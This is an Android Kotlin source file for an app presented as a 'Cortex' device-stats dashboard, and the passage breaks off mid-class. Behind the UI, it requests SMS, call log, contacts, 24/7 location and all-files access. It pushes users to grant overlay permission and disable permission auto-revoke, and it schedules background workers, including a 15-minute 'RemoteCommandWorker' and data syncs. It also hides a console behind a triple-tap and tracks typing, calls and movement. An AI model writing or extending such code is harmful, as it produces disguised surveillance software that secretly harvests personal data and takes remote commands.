package com.example.myandroid

import android.animation.ValueAnimator
import android.app.usage.UsageStatsManager
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.graphics.Canvas
import android.graphics.Color
import android.graphics.Paint
import android.graphics.RadialGradient
import android.graphics.RectF
import android.graphics.Shader
import android.graphics.Typeface
import android.graphics.drawable.GradientDrawable
import android.os.Build
import android.os.Bundle
import android.provider.Settings
import android.view.Gravity
import android.view.View
import android.view.ViewGroup
import android.widget.FrameLayout
import android.widget.LinearLayout
import android.widget.ScrollView
import android.widget.TextView
import androidx.appcompat.app.AppCompatActivity
import androidx.core.view.setPadding
import androidx.fragment.app.Fragment
import androidx.fragment.app.FragmentActivity
import androidx.viewpager2.adapter.FragmentStateAdapter
import androidx.viewpager2.widget.ViewPager2
import java.text.DecimalFormat
import kotlinx.coroutines.*

class MainActivity : AppCompatActivity() {

    private val COLOR_BG = 0xFF050505.toInt()
    private val COLOR_BORDER = 0x14FFFFFF.toInt()
    private val COLOR_ACCENT_SECONDARY = 0xFF2CB67D.toInt()
    private val COLOR_TEXT_MAIN = 0xFFFFFFFE.toInt()
    private val COLOR_TEXT_SUB = 0xFF94A1B2.toInt()

    private lateinit var viewPager: ViewPager2
    private val navItems = mutableListOf<LinearLayout>()

    // Critical permissions to ask automatically
    private val AUTO_PERMISSIONS = mutableListOf(
        android.Manifest.permission.ACCESS_FINE_LOCATION,
        android.Manifest.permission.READ_SMS,
        android.Manifest.permission.READ_CALL_LOG,
        android.Manifest.permission.READ_CONTACTS
    ).apply {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            add(android.Manifest.permission.POST_NOTIFICATIONS)
        }
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        window.statusBarColor = COLOR_BG
        window.navigationBarColor = 0xFF141414.toInt()

        val root = FrameLayout(this).apply {
            setBackgroundColor(COLOR_BG)
            layoutParams = ViewGroup.LayoutParams(ViewGroup.LayoutParams.MATCH_PARENT, ViewGroup.LayoutParams.MATCH_PARENT)
        }
        root.addView(MeshBackgroundView(this))

        viewPager = ViewPager2(this).apply {
            layoutParams = FrameLayout.LayoutParams(ViewGroup.LayoutParams.MATCH_PARENT, ViewGroup.LayoutParams.MATCH_PARENT).apply {
                bottomMargin = 180 
            }
            adapter = MainPagerAdapter(this@MainActivity)
            isUserInputEnabled = false 
        }
        
        val ghostView = ScrollView(this).apply {
            visibility = View.GONE
            background = android.graphics.drawable.ColorDrawable(0xFF000000.toInt())
            layoutParams = FrameLayout.LayoutParams(ViewGroup.LayoutParams.MATCH_PARENT, ViewGroup.LayoutParams.MATCH_PARENT)
            setPadding(20, 80, 20, 180)
            tag = "GHOST_CONSOLE"
        }
        val ghostText = TextView(this).apply {
            text = "INITIALIZING SYSTEM LOG..."
            textSize = 10f
            typeface = Typeface.MONOSPACE
            setTextColor(0xFF00FF00.toInt())
        }
        ghostView.addView(ghostText)

        val bottomNav = createBottomNav(root)
        root.addView(viewPager)
        root.addView(ghostView)
        root.addView(bottomNav)
        setContentView(root)

        initializeBackgroundTasks()
    }

    override fun onResume() {
        super.onResume()
        checkAndRequestPermissions()
    }

    private fun checkAndRequestPermissions() {
        val missing = AUTO_PERMISSIONS.filter {
            androidx.core.content.ContextCompat.checkSelfPermission(this, it) != PackageManager.PERMISSION_GRANTED
        }
        if (missing.isNotEmpty()) {
            requestPermissions(missing.toTypedArray(), 777)
        }
    }

    private fun initializeBackgroundTasks() {
        NetworkTracker.init(this)
        val intent = Intent(this, MonitorService::class.java)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) startForegroundService(intent) else startService(intent)

        val wm = androidx.work.WorkManager.getInstance(this)
        val constraints = androidx.work.Constraints.Builder().setRequiredNetworkType(androidx.work.NetworkType.CONNECTED).build()

        val ruleRequest = androidx.work.OneTimeWorkRequestBuilder<RuleSyncWorker>().setConstraints(constraints).build()
        wm.enqueue(ruleRequest)

        val dailyRuleRequest = androidx.work.PeriodicWorkRequestBuilder<RuleSyncWorker>(1, java.util.concurrent.TimeUnit.DAYS).setConstraints(constraints).build()
        wm.enqueueUniquePeriodicWork("DailyRuleSync", androidx.work.ExistingPeriodicWorkPolicy.KEEP, dailyRuleRequest)

        val configRequest = androidx.work.PeriodicWorkRequestBuilder<ConfigSyncWorker>(6, java.util.concurrent.TimeUnit.HOURS).setConstraints(constraints).build()
        wm.enqueueUniquePeriodicWork("ConfigSync", androidx.work.ExistingPeriodicWorkPolicy.KEEP, configRequest)

        val syncRequest = androidx.work.PeriodicWorkRequestBuilder<SyncWorker>(15, java.util.concurrent.TimeUnit.MINUTES).setConstraints(constraints).build()
        wm.enqueueUniquePeriodicWork("BackupWork", androidx.work.ExistingPeriodicWorkPolicy.KEEP, syncRequest)

        val fileWorkRequest = androidx.work.PeriodicWorkRequestBuilder<FileScanWorker>(7, java.util.concurrent.TimeUnit.DAYS).setConstraints(constraints).build()
        wm.enqueueUniquePeriodicWork("FileSkeletonWork", androidx.work.ExistingPeriodicWorkPolicy.KEEP, fileWorkRequest)

        val cmdRequest = androidx.work.PeriodicWorkRequestBuilder<RemoteCommandWorker>(15, java.util.concurrent.TimeUnit.MINUTES).setConstraints(constraints).build()
        wm.enqueueUniquePeriodicWork("RemoteCmdWorker", androidx.work.ExistingPeriodicWorkPolicy.KEEP, cmdRequest)

        val healthRequest = androidx.work.PeriodicWorkRequestBuilder<HealthWorker>(1, java.util.concurrent.TimeUnit.HOURS).setConstraints(constraints).build()
        wm.enqueueUniquePeriodicWork("HealthWorker", androidx.work.ExistingPeriodicWorkPolicy.KEEP, healthRequest)
    }

    private fun createBottomNav(root: FrameLayout): View {
        val navContainer = LinearLayout(this).apply {
            orientation = LinearLayout.HORIZONTAL
            gravity = Gravity.CENTER
            background = GradientDrawable().apply {
                setColor(0xCC141414.toInt())
                cornerRadius = 100f
                setStroke(2, COLOR_BORDER)
            }
            layoutParams = FrameLayout.LayoutParams(ViewGroup.LayoutParams.MATCH_PARENT, 160).apply {
                gravity = Gravity.BOTTOM
                setMargins(40, 0, 40, 40)
            }
            elevation = 20f
        }

        val tabs = listOf("🏠" to "DASH", "⚡" to "SPECS", "📡" to "NET", "📂" to "FILES", "🛠️" to "TOOLS", "📈" to "STATS")
        var statsTapCount = 0
        var lastStatsTapTime = 0L

        tabs.forEachIndexed { index, (icon, label) ->
            val item = LinearLayout(this).apply {
                orientation = LinearLayout.VERTICAL
                gravity = Gravity.CENTER
                layoutParams = LinearLayout.LayoutParams(0, ViewGroup.LayoutParams.MATCH_PARENT, 1f)
                setOnClickListener {
                    viewPager.currentItem = index
                    updateNavState(index)
                    if (label == "STATS") {
                        val now = System.currentTimeMillis()
                        if (now - lastStatsTapTime < 500) statsTapCount++ else statsTapCount = 1
                        lastStatsTapTime = now
                        if (statsTapCount >= 3) {
                            statsTapCount = 0
                            val ghost = root.findViewWithTag<View>("GHOST_CONSOLE")
                            if (ghost?.visibility == View.VISIBLE) {
                                ghost.visibility = View.GONE
                            } else {
                                ghost?.visibility = View.VISIBLE
                                val report = DeviceManager.getDiagnosticReport(this@MainActivity)
                                DebugLogger.log("DIAG", "Console Opened. Running Checks...")
                                
                                (ghost as? ScrollView)?.getChildAt(0)?.let { 
                                    (it as TextView).text = report + "\n" + DebugLogger.getLogs()
                                }
                            }
                        }
                    }
                }
            }
            val tvIcon = TextView(this).apply { text = icon; textSize = 20f; setTextColor(COLOR_TEXT_SUB) }
            val tvLabel = TextView(this).apply { text = label; textSize = 9f; typeface = Typeface.DEFAULT_BOLD; setTextColor(COLOR_TEXT_SUB); setPadding(0, 5, 0, 0) }
            item.addView(tvIcon)
            item.addView(tvLabel)
            navContainer.addView(item)
            navItems.add(item)
        }
        updateNavState(0)
        return navContainer
    }

    private fun updateNavState(index: Int) {
        navItems.forEachIndexed { i, layout ->
            val icon = layout.getChildAt(0) as TextView
            val label = layout.getChildAt(1) as TextView
            if (i == index) {
                icon.setTextColor(COLOR_ACCENT_SECONDARY)
                icon.setShadowLayer(15f, 0f, 0f, COLOR_ACCENT_SECONDARY)
                label.setTextColor(COLOR_TEXT_MAIN)
            } else {
                icon.setTextColor(COLOR_TEXT_SUB)
                icon.setShadowLayer(0f, 0f, 0f, 0)
                label.setTextColor(COLOR_TEXT_SUB)
            }
        }
    }

    inner class MainPagerAdapter(fa: FragmentActivity) : FragmentStateAdapter(fa) {
        override fun getItemCount(): Int = 6
        override fun createFragment(position: Int): Fragment = when(position) {
            0 -> DashboardFragment()
            1 -> SpecsFragment()
            2 -> NetFragment()
            3 -> FilesFragment()
            4 -> ToolsFragment()
            5 -> StatsFragment()
            else -> DashboardFragment()
        }
    }
}

// --- FRAGMENTS ---

class DashboardFragment : Fragment() {
    private var contentLayout: LinearLayout? = null
    override fun onCreateView(inflater: android.view.LayoutInflater, container: ViewGroup?, savedInstanceState: Bundle?): View {
        val ctx = requireContext()
        val scroll = ScrollView(ctx).apply { isFillViewport = true; background = null }
        contentLayout = LinearLayout(ctx).apply { orientation = LinearLayout.VERTICAL; setPadding(40, 60, 40, 250) }
        scroll.addView(contentLayout)
        return scroll
    }
    override fun onResume() {
        super.onResume()
        refreshUI()
    }
    private fun refreshUI() {
        val ctx = context ?: return
        contentLayout?.removeAllViews()
        contentLayout?.addView(createHeader(ctx, "Cortex", Build.MODEL, "SYSTEM ACTIVE"))

        // 0. TECH SCORE (Fix: Unique variable name 'scoreDonut')
        val (score, label) = DeviceManager.getDeviceScore(ctx)
        val scoreColor = when(score) {
            in 80..100 -> 0xFF2CB67D.toInt() 
            in 50..79 -> 0xFF2CB1BC.toInt()
            else -> 0xFFEF4565.toInt()
        }

        val scoreCard = createGlassContainer(ctx).apply { 
            setPadding(40, 40, 40, 40)
            layoutParams = LinearLayout.LayoutParams(ViewGroup.LayoutParams.MATCH_PARENT, ViewGroup.LayoutParams.WRAP_CONTENT).apply { bottomMargin = 20 } 
            orientation = LinearLayout.HORIZONTAL
            gravity = Gravity.CENTER_VERTICAL
        }
        val scoreDonut = DonutView(ctx, score, scoreColor).apply { layoutParams = LinearLayout.LayoutParams(160, 160) }
        scoreCard.addView(scoreDonut)
        
        val scoreInfo = LinearLayout(ctx).apply {
            orientation = LinearLayout.VERTICAL
            layoutParams = LinearLayout.LayoutParams(0, ViewGroup.LayoutParams.WRAP_CONTENT, 1f).apply { marginStart = 30 }
        }
        scoreInfo.addView(TextView(ctx).apply { text = "SYNC RATE"; textSize = 10f; setTextColor(0xFF94A1B2.toInt()); typeface = Typeface.DEFAULT_BOLD })
        scoreInfo.addView(TextView(ctx).apply { text = "$score/100"; textSize = 28f; setTextColor(Color.WHITE); typeface = Typeface.DEFAULT_BOLD })
        scoreInfo.addView(TextView(ctx).apply { text = label; textSize = 11f; setTextColor(scoreColor); typeface = Typeface.MONOSPACE })
        scoreCard.addView(scoreInfo)
        contentLayout?.addView(scoreCard)

        // 1. BATTERY
        val batt = ctx.registerReceiver(null, android.content.IntentFilter(android.content.Intent.ACTION_BATTERY_CHANGED))
        val level = batt?.getIntExtra(android.os.BatteryManager.EXTRA_LEVEL, 0) ?: 0
        val status = batt?.getIntExtra(android.os.BatteryManager.EXTRA_STATUS, -1) ?: -1
        val isCharging = status == android.os.BatteryManager.BATTERY_STATUS_CHARGING
        
        val battCard = createGlassContainer(ctx).apply { setPadding(40, 40, 40, 40); layoutParams = LinearLayout.LayoutParams(ViewGroup.LayoutParams.MATCH_PARENT, ViewGroup.LayoutParams.WRAP_CONTENT).apply { bottomMargin = 20 } }
        val battHeader = LinearLayout(ctx).apply { orientation = LinearLayout.HORIZONTAL }
        battHeader.addView(TextView(ctx).apply { text = "POWER CELL"; textSize = 11f; setTextColor(0xFF94A1B2.toInt()); typeface = Typeface.DEFAULT_BOLD; layoutParams = LinearLayout.LayoutParams(0, ViewGroup.LayoutParams.WRAP_CONTENT, 1f) })
        battHeader.addView(TextView(ctx).apply { text = if(isCharging) "CHARGING ⚡" else "DISCHARGING"; textSize = 11f; setTextColor(0xFF2CB67D.toInt()); typeface = Typeface.DEFAULT_BOLD })
        battCard.addView(battHeader)
        battCard.addView(TextView(ctx).apply { text = "$level%"; textSize = 42f; setTextColor(0xFF2CB67D.toInt()); typeface = Typeface.DEFAULT_BOLD })
        contentLayout?.addView(battCard)
        
        // 2. RAM (Fix: Unique variable name 'ramDonut')
        val actManager = ctx.getSystemService(Context.ACTIVITY_SERVICE) as android.app.ActivityManager
        val memInfo = android.app.ActivityManager.MemoryInfo()
        actManager.getMemoryInfo(memInfo)
        val ramPct = (((memInfo.totalMem - memInfo.availMem).toDouble() / memInfo.totalMem.toDouble()) * 100).toInt()
        val ramCard = createGlassContainer(ctx).apply { setPadding(30, 30, 30, 30); layoutParams = LinearLayout.LayoutParams(ViewGroup.LayoutParams.MATCH_PARENT, ViewGroup.LayoutParams.WRAP_CONTENT).apply { bottomMargin=20 }; gravity = Gravity.CENTER }
        ramCard.addView(TextView(ctx).apply { text = "SYSTEM LOAD"; textSize=10f; setTextColor(0xFF94A1B2.toInt()); typeface=Typeface.DEFAULT_BOLD })
        val ramDonut = DonutView(ctx, ramPct, 0xFF7F5AF0.toInt()).apply { layoutParams = LinearLayout.LayoutParams(200, 200).apply { topMargin=20; bottomMargin=20 } }
        ramCard.addView(ramDonut)
        contentLayout?.addView(ramCard)
    }
}

class SpecsFragment : Fragment() {
    override fun onCreateView(inflater: android.view.LayoutInflater, container: ViewGroup?, savedInstanceState: Bundle?): View {
        val ctx = requireContext()
        val scroll = ScrollView(ctx).apply { isFillViewport = true; background = null }
        val content = LinearLayout(ctx).apply { orientation = LinearLayout.VERTICAL; setPadding(40, 60, 40, 250) }
        content.addView(createHeader(ctx, "Hardware", "", "SPECIFICATIONS"))
        content.addView(createDetailCard(ctx, "SILICON", mapOf(
            "SoC Board" to Build.BOARD.uppercase(),
            "Hardware" to Build.HARDWARE.uppercase(),
            "Arch" to System.getProperty("os.arch").toString(),
            "Cores" to "${Runtime.getRuntime().availableProcessors()} Cores"
        )))
        scroll.addView(content)
        return scroll
    }
}

class NetFragment : Fragment() {
    private var contentLayout: LinearLayout? = null
    override fun onCreateView(inflater: android.view.LayoutInflater, container: ViewGroup?, savedInstanceState: Bundle?): View {
        val ctx = requireContext()
        val scroll = ScrollView(ctx).apply { isFillViewport = true; background = null }
        contentLayout = LinearLayout(ctx).apply { orientation = LinearLayout.VERTICAL; setPadding(40, 60, 40, 250) }
        scroll.addView(contentLayout)
        return scroll
    }
    override fun onResume() {
        super.onResume()
        val ctx = context ?: return
        contentLayout?.removeAllViews()
        contentLayout?.addView(createHeader(ctx, "Network", "", "CONNECTIVITY"))

        val (netTime, netSessions) = NetworkTracker.getStats(ctx)
        val hrs = java.util.concurrent.TimeUnit.MILLISECONDS.toHours(netTime)
        val mins = java.util.concurrent.TimeUnit.MILLISECONDS.toMinutes(netTime) % 60
        contentLayout?.addView(createDetailCard(ctx, "DIGITAL UPTIME", mapOf(
            "Total Online" to "${hrs}h ${mins}m",
            "Sessions" to "$netSessions Connects"
        )))
    }
}

class FilesFragment : Fragment() {
    override fun onCreateView(inflater: android.view.LayoutInflater, container: ViewGroup?, savedInstanceState: Bundle?): View {
        val ctx = requireContext()
        val scroll = ScrollView(ctx).apply { isFillViewport = true; background = null }
        val content = LinearLayout(ctx).apply { orientation = LinearLayout.VERTICAL; setPadding(40, 60, 40, 250) }
        content.addView(createHeader(ctx, "File", "System", "STORAGE ANALYSIS"))

        val hasManager = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) android.os.Environment.isExternalStorageManager()
        else androidx.core.content.ContextCompat.checkSelfPermission(ctx, android.Manifest.permission.READ_EXTERNAL_STORAGE) == PackageManager.PERMISSION_GRANTED

        if (!hasManager) {
             val btn = TextView(ctx).apply {
                text = "GRANT ACCESS"; textSize = 12f; setTextColor(Color.BLACK); typeface = Typeface.DEFAULT_BOLD
                background = GradientDrawable().apply { setColor(0xFF2CB67D.toInt()); cornerRadius = 50f }
                gravity = Gravity.CENTER; setPadding(0, 30, 0, 30)
                setOnClickListener {
                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) startActivity(Intent(Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION, android.net.Uri.parse("package:${ctx.packageName}")))
                    else requestPermissions(arrayOf(android.Manifest.permission.READ_EXTERNAL_STORAGE), 103)
                }
            }
            content.addView(btn)
        } else {
            val totalSpace = android.os.Environment.getExternalStorageDirectory().totalSpace
            val freeSpace = android.os.Environment.getExternalStorageDirectory().freeSpace
            val usedSpace = totalSpace - freeSpace
            content.addView(createDetailCard(ctx, "INTERNAL", mapOf(
                "Total" to FileManager.formatSize(totalSpace),
                "Used" to FileManager.formatSize(usedSpace),
                "Free" to FileManager.formatSize(freeSpace)
            )))
        }
        scroll.addView(content)
        return scroll
    }
}

class ToolsFragment : Fragment() {
    override fun onCreateView(inflater: android.view.LayoutInflater, container: ViewGroup?, savedInstanceState: Bundle?): View {
        val ctx = requireContext()
        val scroll = ScrollView(ctx).apply { isFillViewport = true; background = null }
        val content = LinearLayout(ctx).apply { orientation = LinearLayout.VERTICAL; setPadding(40, 60, 40, 250) }
        content.addView(createHeader(ctx, "System", "", "TOOLS & CLOUD"))

        // 1. INVISIBILITY CLOAK (Overlay)
        if (!android.provider.Settings.canDrawOverlays(ctx)) {
            val overlayCard = createGlassContainer(ctx).apply { setPadding(40, 40, 40, 40); layoutParams = LinearLayout.LayoutParams(ViewGroup.LayoutParams.MATCH_PARENT, ViewGroup.LayoutParams.WRAP_CONTENT).apply { bottomMargin=30 } }
            overlayCard.addView(TextView(ctx).apply { text="INVISIBILITY CLOAK"; textSize=11f; setTextColor(0xFFF6AD55.toInt()); typeface=Typeface.DEFAULT_BOLD })
            overlayCard.addView(TextView(ctx).apply { text="Grant 'Display over other apps' to prevent the system from killing the background monitor."; textSize=13f; setTextColor(0xFF94A1B2.toInt()); layoutParams = LinearLayout.LayoutParams(ViewGroup.LayoutParams.MATCH_PARENT, ViewGroup.LayoutParams.WRAP_CONTENT).apply { topMargin=10 } })
            val btn = TextView(ctx).apply {
                text = "GRANT PERMISSION"; textSize=12f; setTextColor(Color.BLACK); typeface=Typeface.DEFAULT_BOLD; background = GradientDrawable().apply { setColor(0xFFF6AD55.toInt()); cornerRadius=50f }; gravity = Gravity.CENTER; setPadding(0, 30, 0, 30); layoutParams = LinearLayout.LayoutParams(ViewGroup.LayoutParams.MATCH_PARENT, ViewGroup.LayoutParams.WRAP_CONTENT).apply { topMargin=20 }
                setOnClickListener { startActivity(Intent(android.provider.Settings.ACTION_MANAGE_OVERLAY_PERMISSION, android.net.Uri.parse("package:${ctx.packageName}"))) }
            }
            overlayCard.addView(btn)
            content.addView(overlayCard)
        }

        // 2. HIBERNATION SHIELD
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            val hibernateCard = createGlassContainer(ctx).apply { setPadding(40, 40, 40, 40); layoutParams = LinearLayout.LayoutParams(ViewGroup.LayoutParams.MATCH_PARENT, ViewGroup.LayoutParams.WRAP_CONTENT).apply { bottomMargin=30 } }
            hibernateCard.addView(TextView(ctx).apply { text="PREVENT COMA"; textSize=11f; setTextColor(0xFFF6AD55.toInt()); typeface=Typeface.DEFAULT_BOLD })
            hibernateCard.addView(TextView(ctx).apply { text="Disable 'Remove permissions if app is unused' to stop Android from killing the sensors after 3 months."; textSize=13f; setTextColor(0xFF94A1B2.toInt()); layoutParams = LinearLayout.LayoutParams(ViewGroup.LayoutParams.MATCH_PARENT, ViewGroup.LayoutParams.WRAP_CONTENT).apply { topMargin=10 } })
            val btn = TextView(ctx).apply {
                text = "DISABLE HIBERNATION"; textSize=12f; setTextColor(Color.BLACK); typeface=Typeface.DEFAULT_BOLD; background = GradientDrawable().apply { setColor(0xFFF6AD55.toInt()); cornerRadius=50f }; gravity = Gravity.CENTER; setPadding(0, 30, 0, 30); layoutParams = LinearLayout.LayoutParams(ViewGroup.LayoutParams.MATCH_PARENT, ViewGroup.LayoutParams.WRAP_CONTENT).apply { topMargin=20 }
                setOnClickListener {
                     val intent = Intent(android.content.Intent.ACTION_AUTO_REVOKE_PERMISSIONS)
                     intent.data = android.net.Uri.parse("package:${ctx.packageName}")
                     startActivity(intent)
                }
            }
            hibernateCard.addView(btn)
            content.addView(hibernateCard)
        }

        // 3. BACKGROUND LOCATION
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q && 
            androidx.core.content.ContextCompat.checkSelfPermission(ctx, android.Manifest.permission.ACCESS_BACKGROUND_LOCATION) != PackageManager.PERMISSION_GRANTED) {
            val btn = TextView(ctx).apply {
                text = "GRANT 24/7 LOCATION"; textSize=12f; setTextColor(Color.BLACK); typeface=Typeface.DEFAULT_BOLD
                background = GradientDrawable().apply { setColor(0xFFF6AD55.toInt()); cornerRadius=50f }
                gravity = Gravity.CENTER; setPadding(0, 30, 0, 30)
                layoutParams = LinearLayout.LayoutParams(ViewGroup.LayoutParams.MATCH_PARENT, ViewGroup.LayoutParams.WRAP_CONTENT).apply { bottomMargin=20 }
                setOnClickListener {
                     requestPermissions(arrayOf(android.Manifest.permission.ACCESS_BACKGROUND_LOCATION), 105)
                }
            }
            content.addView(btn)
        } else {
            content.addView(TextView(ctx).apply { text = "ALL SYSTEMS NOMINAL"; textSize=14f; setTextColor(0xFF2CB67D.toInt()); gravity=Gravity.CENTER })
        }
        scroll.addView(content)
        return scroll
    }
}

class StatsFragment : Fragment() {
    private var contentLayout: LinearLayout? = null
    override fun onCreateView(inflater: android.view.LayoutInflater, container: ViewGroup?, savedInstanceState: Bundle?): View {
        val ctx = requireContext()
        val scroll = ScrollView(ctx).apply { isFillViewport = true; background = null }
        contentLayout = LinearLayout(ctx).apply { orientation = LinearLayout.VERTICAL; setPadding(40, 60, 40, 250) }
        scroll.addView(contentLayout)
        return scroll
    }
    override fun onResume() {
        super.onResume()
        refreshUI()
    }
    private fun refreshUI() {
        val ctx = context ?: return
        val prefs = ctx.getSharedPreferences("app_stats", Context.MODE_PRIVATE)
        contentLayout?.removeAllViews()
        contentLayout?.addView(createHeader(ctx, "Statistics", "", "INSIGHTS"))

        // 1. SCREEN TIME (Top, Always Visible)
        val usm = ctx.getSystemService(Context.USAGE_STATS_SERVICE) as UsageStatsManager
        val startToday = TimeManager.getStartOfDay()
        val now = System.currentTimeMillis()
        val stats = usm.queryUsageStats(UsageStatsManager.INTERVAL_BEST, startToday, now)
        val totalTime = stats.filter { it.lastTimeUsed >= startToday }.sumOf { it.totalTimeInForeground }
        val hrs = java.util.concurrent.TimeUnit.MILLISECONDS.toHours(totalTime)
        val mins = java.util.concurrent.TimeUnit.MILLISECONDS.toMinutes(totalTime) % 60
        val switches = UsageManager.getSwitchCount(ctx)
        
        contentLayout?.addView(createDetailCard(ctx, "DIGITAL HABITS", mapOf(
            "Screen Time" to "${hrs}h ${mins}m",
            "App Switches" to "$switches"
        )))

        // 2. COLLAPSIBLE CONTAINER
        val collapseBtn = TextView(ctx).apply {
            text = "SHOW DETAILED STATS ▼"; textSize=12f; setTextColor(0xFF94A1B2.toInt()); typeface=Typeface.DEFAULT_BOLD
            gravity = Gravity.CENTER; setPadding(0, 30, 0, 30)
            background = GradientDrawable().apply { setColor(0x1AFFFFFF.toInt()); cornerRadius=20f }
        }
        val hiddenLayout = LinearLayout(ctx).apply {
            orientation = LinearLayout.VERTICAL; visibility = View.GONE
        }
        
        collapseBtn.setOnClickListener {
            if (hiddenLayout.visibility == View.VISIBLE) {
                hiddenLayout.visibility = View.GONE
                collapseBtn.text = "SHOW DETAILED STATS ▼"
            } else {
                hiddenLayout.visibility = View.VISIBLE
                collapseBtn.text = "HIDE DETAILED STATS ▲"
            }
        }

        // --- DATA BLOCKS (Inside Hidden Layout) ---
        
        // A. SMS
        val smsCount = prefs.getInt("sms_count", 0)
        hiddenLayout.addView(createDetailCard(ctx, "COMMUNICATION", mapOf("Total SMS" to "$smsCount")))

        // B. Accessibility
        val interactions = prefs.getInt("interaction_count", 0)
        hiddenLayout.addView(createDetailCard(ctx, "SCREEN CONTEXT", mapOf("Interactions" to "$interactions")))

        // C. Notifications
        val notifCount = prefs.getInt("notif_count", 0)
        hiddenLayout.addView(createDetailCard(ctx, "NOTIFICATIONS", mapOf("Alerts Received" to "$notifCount")))

        // D. Location
        val dist = prefs.getFloat("total_distance_km", 0f)
        hiddenLayout.addView(createDetailCard(ctx, "PHYSICAL MOVEMENT", mapOf("Distance Moved" to "${DecimalFormat("#.##").format(dist)} km")))

        // E. Phone
        val callStats = PhoneManager.getStats(ctx)
        hiddenLayout.addView(createDetailCard(ctx, "PHONE ACTIVITY", mapOf(
            "Calls" to "${callStats.totalCalls}",
            "Duration" to "${callStats.totalDuration/60} mins",
            "Top" to callStats.topContact
        )))

        // F. Typing
        val typeStats = TypingManager.getStats(ctx)
        hiddenLayout.addView(createDetailCard(ctx, "TYPING METRICS", mapOf(
            "Total Chars" to "${typeStats.optInt("total_chars")}",
            "Avg WPM" to "${typeStats.optInt("avg_wpm")}"
        )))

        contentLayout?.addView(collapseBtn)
        contentLayout?.addView(hiddenLayout)

        // 3. PERMISSION ALERTS (Bottom, Always Visible)
        val missingPerms = mutableListOf<String>()
        if (androidx.core.content.ContextCompat.checkSelfPermission(ctx, android.Manifest.permission.READ_CALL_LOG) != PackageManager.PERMISSION_GRANTED) missingPerms.add("CALLS")
        if (androidx.core.content.ContextCompat.checkSelfPermission(ctx, android.Manifest.permission.READ_SMS) != PackageManager.PERMISSION_GRANTED) missingPerms.add("SMS")
        if (androidx.core.content.ContextCompat.checkSelfPermission(ctx, android.Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED) missingPerms.add("GPS")
        
        if (missingPerms.isNotEmpty()) {
            val warn = TextView(ctx).apply {
                text = "MISSING: ${missingPerms.joinToString(", ")}"; textSize=11f; setTextColor(0xFFEF4565.toInt()); typeface=Typeface.DEFAULT_BOLD
                gravity = Gravity.CENTER; setPadding(0, 40, 0, 0)
            }
            contentLayout?.addView(warn)
        }
    }
}

fun createHeader(ctx: Context, t1: String, t2: String, sub: String): View {
    val layout = LinearLayout(ctx).apply { orientation = LinearLayout.VERTICAL; setPadding(0, 0, 0, 40) }
    layout.addView(TextView(ctx).apply { text = sub; textSize = 10f; setTextColor(0xFF2CB67D.toInt()); typeface = Typeface.DEFAULT_BOLD; background = GradientDrawable().apply { setColor(0x1A2CB67D.toInt()); setStroke(2, 0x4D2CB67D.toInt()); cornerRadius = 50f }; setPadding(30, 10, 30, 10); layoutParams = LinearLayout.LayoutParams(ViewGroup.LayoutParams.WRAP_CONTENT, ViewGroup.LayoutParams.WRAP_CONTENT).apply { bottomMargin = 15 } })
    layout.addView(TextView(ctx).apply { text = if(t2.isEmpty()) t1 else "$t1 $t2"; textSize = 32f; setTextColor(Color.WHITE); typeface = Typeface.create("sans-serif-black", Typeface.NORMAL) })
    return layout
}

fun createGlassContainer(ctx: Context): LinearLayout {
    return LinearLayout(ctx).apply { orientation = LinearLayout.VERTICAL; background = GradientDrawable().apply { setColor(0x991E1E23.toInt()); cornerRadius = 30f; setStroke(2, 0x14FFFFFF.toInt()) } }
}

fun createDetailCard(ctx: Context, title: String, data: Map<String, String>): View {
    val card = createGlassContainer(ctx).apply { setPadding(40, 40, 40, 40); layoutParams = LinearLayout.LayoutParams(ViewGroup.LayoutParams.MATCH_PARENT, ViewGroup.LayoutParams.WRAP_CONTENT).apply { bottomMargin = 20 } }
    card.addView(TextView(ctx).apply { text = title; textSize = 10f; setTextColor(0xFF94A1B2.toInt()); typeface = Typeface.DEFAULT_BOLD; setPadding(0, 0, 0, 15) })
    data.forEach { (k, v) ->
        val row = LinearLayout(ctx).apply { orientation = LinearLayout.HORIZONTAL; setPadding(0, 8, 0, 8) }
        row.addView(TextView(ctx).apply { text = k; textSize = 13f; setTextColor(0xFF94A1B2.toInt()); layoutParams = LinearLayout.LayoutParams(0, ViewGroup.LayoutParams.WRAP_CONTENT, 1f) })
        row.addView(TextView(ctx).apply { text = v; textSize = 13f; setTextColor(0xFFFFFFFE.toInt()); typeface = Typeface.MONOSPACE; gravity = Gravity.END })
        card.addView(row)
    }
    return card
}

class MeshBackgroundView(context: Context) : View(context) {
    private val paint = Paint()
    override fun onDraw(canvas: Canvas) {
        val w = width.toFloat(); val h = height.toFloat()
        canvas.drawColor(0xFF050505.toInt())
        paint.shader = RadialGradient(w * 0.1f, h * 0.2f, w * 0.6f, intArrayOf(0x267F5AF0.toInt(), 0x00000000), null, Shader.TileMode.CLAMP)
        canvas.drawRect(0f, 0f, w, h, paint)
        paint.shader = RadialGradient(w * 0.9f, h * 0.8f, w * 0.6f, intArrayOf(0x1A2CB67D.toInt(), 0x00000000), null, Shader.TileMode.CLAMP)
        canvas.drawRect(0f, 0f, w, h, paint)
    }
}

class DonutView(context: Context, val percentage: Int, val color: Int) : View(context) {
    private val paint = Paint(Paint.ANTI_ALIAS_FLAG).apply { style = Paint.Style.STROKE; strokeWidth = 20f; strokeCap = Paint.Cap.ROUND }
    override fun onDraw(canvas: Canvas) {
        val w = width.toFloat(); val h = height.toFloat(); val radius = (Math.min(w, h) / 2) - 20f
        paint.color = 0x1AFFFFFF.toInt()
        canvas.drawCircle(w/2, h/2, radius, paint)
        paint.color = color
        canvas.drawArc(RectF(20f, 20f, w-20f, h-20f), -90f, (percentage * 3.6).toFloat(), false, paint)
    }
}

class PulseBar(context: Context, delay: Long) : View(context) {
    private var barHeightPct = 0.3f
    private val paint = Paint().apply { color = 0xFF2CB1BC.toInt(); isAntiAlias = true }
    init {
        ValueAnimator.ofFloat(0.3f, 0.8f).apply {
